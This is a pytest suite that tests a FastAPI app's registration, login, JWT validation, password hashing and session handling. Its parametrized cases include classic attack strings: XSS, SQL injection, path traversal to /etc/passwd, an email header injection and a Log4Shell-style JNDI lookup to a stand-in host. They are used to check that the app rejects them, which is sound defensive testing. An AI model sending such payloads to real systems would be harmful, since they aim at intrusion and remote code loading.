# tests/test_auth_comprehensive.py
"""
Comprehensive authentication tests covering all edge cases and security scenarios.
Tests follow TDD principles with clear arrange-act-assert structure.
"""

import pytest
import datetime
from unittest.mock import patch, MagicMock
from fastapi.testclient import TestClient

from factories import (
    UserFactory, RegisterInFactory, LoginInFactory,
    EdgeCaseDataFactory, BDDDataFactory
)


class TestUserRegistration:
    """Comprehensive user registration tests."""

    @pytest.mark.auth
    @pytest.mark.unit
    def test_register_user_success_happy_path(self, client):
        """REG-001: Successful user registration with valid data."""
        # Arrange
        user_data = RegisterInFactory()

        # Act
        response = client.post("/api/v1/auth/register", json=user_data.dict())

        # Assert
        assert response.status_code == 200
        data = response.json()
        assert "id" in data
        assert data["message"] == "User registered successfully"
        assert len(data["id"]) == 24  # MongoDB ObjectId length

    @pytest.mark.auth
    @pytest.mark.security
    @pytest.mark.parametrize("field_name, invalid_value", [
        ("email", "invalid-email-format"),
        ("email", "plainaddress"),
        ("email", "@missing-local.com"),
        ("email", "missing-at-sign.com"),
        ("name", ""),
        ("name", "a" * 101),  # Over max length
        ("password", "short"),
        ("password", "a" * 129),  # Over max length
    ])
    def test_register_validation_invalid_fields(self, client, field_name, invalid_value):
        """REG-002: Registration fails with invalid field values."""
        # Arrange
        user_data = RegisterInFactory()
        setattr(user_data, field_name, invalid_value)

        # Act
        response = client.post("/api/v1/auth/register", json=user_data.dict())

        # Assert
        assert response.status_code == 422
        data = response.json()
        assert "detail" in data

    @pytest.mark.auth
    @pytest.mark.security
    def test_register_duplicate_email_fails(self, client):
        """REG-003: Registration fails with duplicate email."""
        # Arrange
        user_data = RegisterInFactory()

        # First registration - should succeed
        response1 = client.post("/api/v1/auth/register", json=user_data.dict())
        assert response1.status_code == 200

        # Second registration with same email - should fail
        # Act
        response2 = client.post("/api/v1/auth/register", json=user_data.dict())

        # Assert
        assert response2.status_code == 400
        data = response2.json()
        assert "already registered" in data["detail"].lower()

    @pytest.mark.auth
    @pytest.mark.security
    @pytest.mark.parametrize("malicious_payload", [
        {"email": "<script>alert('xss')</script>@example.com"},
        {"name": "'; DROP TABLE users; --"},
        {"password": "../../../etc/passwd"},
        {"email": "user@example.com\r\nCc: victim@example.com"},
    ])
    def test_register_injection_attacks(self, client, malicious_payload):
        """REG-004: Registration handles malicious payloads safely."""
        # Arrange
        base_data = RegisterInFactory().dict()
        base_data.update(malicious_payload)

        # Act
        response = client.post("/api/v1/auth/register", json=base_data)

        # Assert - Should either succeed (sanitized) or fail validation, not crash
        assert response.status_code in [422, 400, 200]

    @pytest.mark.auth
    @pytest.mark.performance
    def test_register_concurrent_requests(self, client):
        """REG-005: Handle concurrent registration requests."""
        import threading
        import time

        results = []
        user_data = RegisterInFactory()

        def register_user():
            response = client.post("/api/v1/auth/register", json=user_data.dict())
            results.append(response.status_code)

        # Act - Create 10 concurrent registration requests
        threads = [threading.Thread(target=register_user) for _ in range(10)]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()

        # Assert - Only one should succeed (unique email constraint)
        success_count = sum(1 for code in results if code == 200)
        error_count = sum(1 for code in results if code == 400)

        assert success_count == 1
        assert error_count == 9

    @pytest.mark.auth
    @pytest.mark.security
    def test_register_password_storage_security(self, client, monkeypatch):
        """REG-006: Password is properly hashed and never stored in plain text."""
        # Arrange
        user_data = RegisterInFactory(password="super_secret_password123")
        original_password = user_data.password

        # Mock database collection to inspect stored data
        mock_collection = MagicMock()
        mock_insert_result = MagicMock()
        mock_insert_result.inserted_id = "test_id_12345"
        mock_collection.insert_one.return_value = mock_insert_result

        with patch('db.get_db') as mock_get_db:
            mock_get_db.return_value.users = mock_collection

            # Act
            response = client.post("/api/v1/auth/register", json=user_data.dict())

            # Assert
            assert response.status_code == 200

            # Verify password was hashed (not stored as plain text)
            call_args = mock_collection.insert_one.call_args[0][0]
            stored_password = call_args['password_hash']

            assert stored_password != original_password
            assert stored_password.startswith('$2b$')  # bcrypt hash prefix
            assert len(stored_password) == 60  # bcrypt hash length

    @pytest.mark.auth
    @pytest.mark.unit
    def test_register_field_sanitize(self, client):
        """REG-007: Input fields are properly sanitized."""
        # Arrange
        user_data = RegisterInFactory(
            name="  Test User  ",
            email="  TEST@EXAMPLE.COM  "
        )

        # Act
        response = client.post("/api/v1/auth/register", json=user_data.dict())

        # Assert
        assert response.status_code == 200


class TestUserLogin:
    """Comprehensive user login tests."""

    @pytest.mark.auth
    @pytest.mark.unit
    def test_login_success_happy_path(self, client):
        """LOGIN-001: Successful login with valid credentials."""
        # Arrange
        user_data = RegisterInFactory()

        # Register user first
        reg_response = client.post("/api/v1/auth/register", json=user_data.dict())
        assert reg_response.status_code == 200

        # Act
        login_response = client.post("/api/v1/auth/login", json={
            "email": user_data.email,
            "password": user_data.password
        })

        # Assert
        assert login_response.status_code == 200
        data = login_response.json()
        assert "accessToken" in data
        assert "user" in data
        assert data["user"]["email"] == user_data.email.lower()
        assert data["user"]["name"] == user_data.name
        assert "password" not in data["user"]  # Password should not be returned

    @pytest.mark.auth
    @pytest.mark.security
    def test_login_invalid_credentials(self, client):
        """LOGIN-002: Login fails with invalid credentials."""
        # Arrange
        user_data = RegisterInFactory()

        # Register user first
        client.post("/api/v1/auth/register", json=user_data.dict())

        # Act
        response = client.post("/api/v1/auth/login", json={
            "email": user_data.email,
            "password": "wrong_password"
        })

        # Assert
        assert response.status_code == 401
        data = response.json()
        assert "invalid credentials" in data["detail"].lower()

    @pytest.mark.auth
    @pytest.mark.security
    def test_login_nonexistent_user(self, client):
        """LOGIN-003: Login fails for non-existent user."""
        # Arrange
        login_data = LoginInFactory()

        # Act
        response = client.post("/api/v1/auth/login", json=login_data.dict())

        # Assert
        assert response.status_code == 401
        data = response.json()
        assert "invalid credentials" in data["detail"].lower()

    @pytest.mark.auth
    @pytest.mark.security
    @pytest.mark.parametrize("malicious_payload", [
        {"email": "'; SELECT * FROM users; --", "password": "password"},
        {"email": "admin@example.com", "password": "' OR '1'='1"},
        {"email": "user@example.com", "password": "${jndi:ldap://malicious.com/a}"},
    ])
    def test_login_injection_attempts(self, client, malicious_payload):
        """LOGIN-004: Login safely handles injection attempts."""
        # Act
        response = client.post("/api/v1/auth/login", json=malicious_payload)

        # Assert - Should fail gracefully, not crash or succeed
        assert response.status_code in [401, 422]

    @pytest.mark.auth
    @pytest.mark.performance
    def test_login_timing_attack_resistance(self, client):
        """LOGIN-005: Login response time is consistent for valid vs invalid users."""
        import time

        # Arrange
        valid_user = RegisterInFactory()
        client.post("/api/v1/auth/register", json=valid_user.dict())

        # Measure login time for valid user with wrong password
        start_time = time.time()
        response1 = client.post("/api/v1/auth/login", json={
            "email": valid_user.email,
            "password": "wrong_password"
        })
        valid_user_wrong_pass_time = time.time() - start_time

        # Measure login time for non-existent user
        start_time = time.time()
        response2 = client.post("/api/v1/auth/login", json={
            "email": "nonexistent@example.com",
            "password": "password"
        })
        nonexistent_user_time = time.time() - start_time

        # Assert - Times should be similar (within 50% difference)
        time_difference = abs(valid_user_wrong_pass_time - nonexistent_user_time)
        assert time_difference < max(valid_user_wrong_pass_time, nonexistent_user_time) * 0.5

    @pytest.mark.auth
    @pytest.mark.security
    def test_login_case_insensitive_email(self, client):
        """LOGIN-006: Login works with case-insensitive email."""
        # Arrange
        user_data = RegisterInFactory(email="Test@Example.COM")

        # Register user
        client.post("/api/v1/auth/register", json=user_data.dict())

        # Act - Try login with different case
        response = client.post("/api/v1/auth/login", json={
            "email": "test@EXAMPLE.com",
            "password": user_data.password
        })

        # Assert
        assert response.status_code == 200
        data = response.json()
        assert "accessToken" in data

    @pytest.mark.auth
    @pytest.mark.integration
    def test_login_jwt_token_format(self, client):
        """LOGIN-007: JWT token has correct format and claims."""
        # Arrange
        user_data = RegisterInFactory()
        client.post("/api/v1/auth/register", json=user_data.dict())

        # Act
        response = client.post("/api/v1/auth/login", json={
            "email": user_data.email,
            "password": user_data.password
        })

        # Assert
        assert response.status_code == 200
        data = response.json()
        token = data["accessToken"]

        # JWT token should have 3 parts separated by dots
        assert isinstance(token, str)
        assert token.count('.') == 2

        # Token should be base64 encoded
        import base64
        try:
            header_b64, payload_b64, signature_b64 = token.split('.')
            # Padding might be needed for decoding
            header = base64.urlsafe_b64decode(header_b64 + '==')
            payload = base64.urlsafe_b64decode(payload_b64 + '==')

            import json
            header_data = json.loads(header)
            payload_data = json.loads(payload)

            # Verify JWT header
            assert header_data["alg"] == "HS256"
            assert header_data["typ"] == "JWT"

            # Verify JWT payload
            assert "sub" in payload_data  # Subject (user ID)
            assert "email" in payload_data
            assert "name" in payload_data
            assert "exp" in payload_data  # Expiration time

        except Exception:
            pytest.fail("JWT token format is invalid")

    @pytest.mark.auth
    @pytest.mark.performance
    def test_login_concurrent_attempts(self, client):
        """LOGIN-008: Handle concurrent login attempts safely."""
        import threading

        # Arrange
        user_data = RegisterInFactory()
        client.post("/api/v1/auth/register", json=user_data.dict())

        results = []

        def login_attempt():
            response = client.post("/api/v1/auth/login", json={
                "email": user_data.email,
                "password": user_data.password
            })
            results.append(response.status_code)

        # Act - 5 concurrent login attempts
        threads = [threading.Thread(target=login_attempt) for _ in range(5)]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()

        # Assert - All should succeed
        assert all(code == 200 for code in results)


class TestTokenValidation:
    """JWT token validation tests."""

    @pytest.fixture
    def auth_headers(self, client):
        """Fixture to get authenticated headers."""
        user_data = RegisterInFactory()
        client.post("/api/v1/auth/register", json=user_data.dict())

        response = client.post("/api/v1/auth/login", json={
            "email": user_data.email,
            "password": user_data.password
        })

        token = response.json()["accessToken"]
        return {"Authorization": f"Bearer {token}"}

    @pytest.mark.auth
    @pytest.mark.security
    def test_protected_endpoint_valid_token(self, client, auth_headers):
        """TOKEN-001: Valid token allows access to protected endpoints."""
        response = client.get("/api/v1/scans", headers=auth_headers)
        assert response.status_code == 200

    @pytest.mark.auth
    @pytest.mark.security
    def test_protected_endpoint_invalid_token(self, client):
        """TOKEN-002: Invalid token is rejected."""
        invalid_headers = {"Authorization": "Bearer invalid_token"}
        response = client.get("/api/v1/scans", headers=invalid_headers)
        assert response.status_code == 401

    @pytest.mark.auth
    @pytest.mark.security
    def test_protected_endpoint_missing_token(self, client):
        """TOKEN-003: Missing token is rejected."""
        response = client.get("/api/v1/scans")
        assert response.status_code == 401

    @pytest.mark.auth
    @pytest.mark.security
    @pytest.mark.parametrize("malformed_token", [
        "not.a.jwt",
        "invalid_base64_payload.jwt",
        "header.",
        ".payload.",
        "...",
        "",
        "Bearer token_without_bearer_prefix",
    ])
    def test_malformed_token_rejection(self, client, malformed_token):
        """TOKEN-004: Malformed tokens are rejected."""
        headers = {"Authorization": f"Bearer {malformed_token}"}
        response = client.get("/api/v1/scans", headers=headers)
        assert response.status_code == 401

    @pytest.mark.auth
    @pytest.mark.security
    @patch('security.decode_token')
    def test_expired_token_rejection(self, mock_decode, client):
        """TOKEN-005: Expired tokens are rejected."""
        # Arrange
        mock_decode.side_effect = Exception("Token has expired")
        headers = {"Authorization": "Bearer expired_token"}

        # Act
        response = client.get("/api/v1/scans", headers=headers)

        # Assert
        assert response.status_code == 401

    @pytest.mark.auth
    @pytest.mark.security
    def test_token_tampering_detection(self, client):
        """TOKEN-006: Tampered tokens are detected and rejected."""
        # Get a valid token first
        user_data = RegisterInFactory()
        client.post("/api/v1/auth/register", json=user_data.dict())

        response = client.post("/api/v1/auth/login", json={
            "email": user_data.email,
            "password": user_data.password
        })

        valid_token = response.json()["accessToken"]

        # Tamper with the token by changing the last character
        tampered_token = valid_token[:-1] + ('0' if valid_token[-1] != '0' else '1')

        headers = {"Authorization": f"Bearer {tampered_token}"}
        response = client.get("/api/v1/scans", headers=headers)

        assert response.status_code == 401


class TestPasswordSecurity:
    """Password security and hashing tests."""

    @pytest.mark.auth
    @pytest.mark.security
    @pytest.mark.parametrize("weak_password", [
        "12345678",
        "password",
        "qwerty",
        "abcabcab",
        "short",
        "UPPERCASE",
        "lowercase",
        "NumbersOnly123",
    ])
    def test_weak_password_allowed_but_hashed(self, client, weak_password):
        """PWD-001: Weak passwords are allowed but properly hashed."""
        # Arrange
        user_data = RegisterInFactory(password=weak_password)

        # Mock database to inspect stored password
        mock_collection = MagicMock()
        mock_insert_result = MagicMock()
        mock_insert_result.inserted_id = "test_id"
        mock_collection.insert_one.return_value = mock_insert_result

        with patch('db.get_db') as mock_get_db:
            mock_get_db.return_value.users = mock_collection

            # Act
            response = client.post("/api/v1/auth/register", json=user_data.dict())

            # Assert
            assert response.status_code == 200

            # Verify password was still hashed properly
            stored_password = mock_collection.insert_one.call_args[0][0]['password_hash']
            assert stored_password != weak_password
            assert stored_password.startswith('$2b$')

    @pytest.mark.auth
    @pytest.mark.security
    def test_password_hash_consistency(self, client, monkeypatch):
        """PWD-002: Same password produces different hashes (due to salt)."""
        user_data = RegisterInFactory(password="same_password_for_all")

        stored_hashes = []

        # Mock database to collect stored hashes
        def mock_insert_one(user_doc):
            stored_hashes.append(user_doc['password_hash'])
            mock_result = MagicMock()
            mock_result.inserted_id = f"test_id_{len(stored_hashes)}"
            return mock_result

        mock_collection = MagicMock()
        mock_collection.insert_one.side_effect = mock_insert_one

        with patch('db.get_db') as mock_get_db:
            mock_get_db.return_value.users = mock_collection

            # Register same password with different emails
            for i in range(5):
                user_data.email = f"user{i}@example.com"
                response = client.post("/api/v1/auth/register", json=user_data.dict())
                assert response.status_code == 200

            # Assert - All hashes should be different
            assert len(set(stored_hashes)) == 5

    @pytest.mark.auth
    @pytest.mark.security
    def test_password_maximum_length_handling(self, client):
        """PWD-003: Very long passwords are handled correctly."""
        # Arrange - Create a very long password (130 chars - over limit)
        long_password = "a" * 130
        user_data = RegisterInFactory(password=long_password)

        # Act
        response = client.post("/api/v1/auth/register", json=user_data.dict())

        # Assert - Should fail validation due to length limit
        assert response.status_code == 422

    @pytest.mark.auth
    @pytest.mark.security
    def test_password_unicode_handling(self, client):
        """PWD-004: Passwords with Unicode characters are handled correctly."""
        # Arrange
        unicode_passwords = [
            "密码123!@#",  # Chinese characters
            "пароль123!",  # Cyrillic characters
            "motdepasse123éàç",  # French accented characters
            "🚀🔥💯password",  # Emojis
            "นี่คือรหัสผ่าน123",  # Thai characters
        ]

        for password in unicode_passwords:
            user_data = RegisterInFactory(password=password)

            # Act
            response = client.post("/api/v1/auth/register", json=user_data.dict())

            # Assert - Should either succeed or fail validation, not crash
            assert response.status_code in [200, 422]


class TestSessionManagement:
    """Session management and token lifecycle tests."""

    @pytest.mark.auth
    @pytest.mark.integration
    def test_multiple_concurrent_sessions(self, client):
        """SESSION-001: User can have multiple concurrent sessions."""
        # Arrange
        user_data = RegisterInFactory()
        client.post("/api/v1/auth/register", json=user_data.dict())

        # Act - Login multiple times to get multiple tokens
        tokens = []
        for i in range(3):
            response = client.post("/api/v1/auth/login", json={
                "email": user_data.email,
                "password": user_data.password
            })
            tokens.append(response.json()["accessToken"])

        # Assert - All tokens should be valid
        for token in tokens:
            headers = {"Authorization": f"Bearer {token}"}
            response = client.get("/api/v1/scans", headers=headers)
            assert response.status_code == 200

    @pytest.mark.auth
    @pytest.mark.performance
    def test_token_validation_performance(self, client, auth_headers):
        """SESSION-002: Token validation is performant."""
        import time

        # Act - Measure token validation time
        start_time = time.time()
        for _ in range(100):
            response = client.get("/api/v1/scans", headers=auth_headers)
            assert response.status_code == 200
        end_time = time.time()

        # Assert - Average validation should be under 10ms
        avg_time = (end_time - start_time) / 100
        assert avg_time < 0.01  # 10ms